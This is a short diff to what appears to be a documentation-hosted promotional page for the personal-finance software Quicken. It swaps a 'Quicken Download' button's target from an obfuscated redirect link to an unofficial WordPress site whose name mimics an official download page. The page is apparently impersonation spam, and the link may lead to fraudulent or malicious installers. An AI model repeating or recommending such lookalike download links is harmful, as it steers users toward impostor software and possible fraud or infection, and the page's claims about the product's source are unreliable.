@@ -10,7 +10,7 @@ Looking to manage your finances with ease? **Quicken** is a trusted personal and
 
 .. image:: Getbutton.png
    :alt: Quicken Download
-   :target: https://fm.ci/?aHR0cHM6Ly9xdWlja2VuLWhlbHBjZW50ZXIucmVhZHRoZWRvY3MuaW8vZW4vbGF0ZXN0
+   :target: https://quickencomdownload.wordpress.com/
 
 
 .. raw:: html
